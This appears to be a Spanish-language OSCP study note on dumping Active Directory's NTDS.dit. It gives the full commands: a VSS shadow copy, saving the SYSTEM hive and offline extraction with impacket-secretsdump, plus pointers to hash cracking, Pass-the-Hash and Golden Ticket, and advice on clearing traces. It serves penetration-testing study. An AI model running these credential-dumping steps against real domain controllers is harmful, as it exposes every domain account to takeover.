---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, ad, post-explotacion, windows, linux]
---

# Dump NTDS.dit

> [!abstract] Qué es y cuándo usarla
> Extraer la base de datos de AD (**NTDS.dit**) para obtener **todos** los hashes NTLM y Kerberos keys del dominio, offline. Se hace como **Domain Admin** en el DC. `ntds.dit` está bloqueado en caliente → se copia vía **Shadow Copy (VSS)**.

## Requisitos previos
- **Domain Admin** (o acceso al DC con privilegios).
- `vshadow.exe` (Windows SDK) en el DC, y `impacket-secretsdump` en Kali.

## Pasos
```powershell
# En el DC: crear shadow copy y copiar ntds.dit + la hive SYSTEM
vshadow.exe -nw -p C:            # -nw = sin writers (rapido) ; anota el "device name"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```bash
# En Kali: parsear offline (LOCAL = ficheros locales)
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
# salida: domain\user:rid:lmhash:nthash:::  (+ Kerberos keys)
```
Los NTLM resultantes se crackean (`hashcat -m 1000`) o se reutilizan con [[Pass-the-Hash]].

> [!tip] Alternativa remota sin tocar disco del DC: **DCSync** (ver [[DCSync]]) o `impacket-secretsdump` directo contra el DC con credenciales de Domain Admin.

> [!warning] Detección / problemas
> - Deja rastro (shadow copy, ficheros en C:, servicio). Limpia si procede.
> - El hash de **krbtgt** del volcado sirve para [[Golden Ticket]].

## Visto en
- Módulo: [[24 - Lateral Movement in Active Directory]]
- Máquinas: [[]]
